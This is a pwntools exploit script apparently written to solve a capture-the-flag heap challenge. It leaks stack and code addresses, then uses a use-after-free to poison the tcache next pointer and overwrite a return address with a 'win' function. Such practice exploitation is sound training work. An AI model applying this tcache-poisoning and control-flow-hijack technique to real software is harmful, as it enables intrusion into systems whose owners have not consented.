#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level11.1_patched'
p = process(binary)

s = '''
b malloc
b free
b * main+1628

set follow-fork-mode parent
set detach-on-fork off 
'''

#gdb.attach(p, s)

context.log_level = 'debug'







p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline(b"scanf")
p.sendline("0")
p.sendline(b"AA")


p.sendline(b"echo 0 0")
p.sendline(b"echo 0 232")


p.recvuntil(b"Data: ")

p.sendline(b"echo 0 224")


p.recvuntil(b"Data: ")

leak1 = p.recvuntil(b"\n", drop=True)
leak1 = u64(leak1.ljust(8, b"\x00"))
log.info(f"Leaked address 1: {hex(leak1)}")

p.recvuntil(b"Data: ")
leak2 = p.recvuntil(b"\n", drop=True)
leak2 = u64(leak2.ljust(8, b"\x00"))
log.info(f"Leaked address 2: {hex(leak2)}")



win = leak2 - 0xc10
rip = leak1 + 0x176


log.info(f"win: {hex(win)}")
log.info(f"rip: {hex(rip)}")
#gdb.attach(p, s)



p.sendline("free 0")
p.sendline("free 1")

# 1 0

# uaf
# overwriting the next* pointer 
p.sendline(b"scanf")
p.sendline("1") # 0 becomes rip_addr
p.sendline(p64(rip)) # 8 bytes before destination


p.sendline("malloc 1 100")
p.sendline("malloc 0 100")


p.sendline(b"scanf")
p.sendline("0")
p.sendline(p64(win))


p.sendline("quit")


p.interactive()



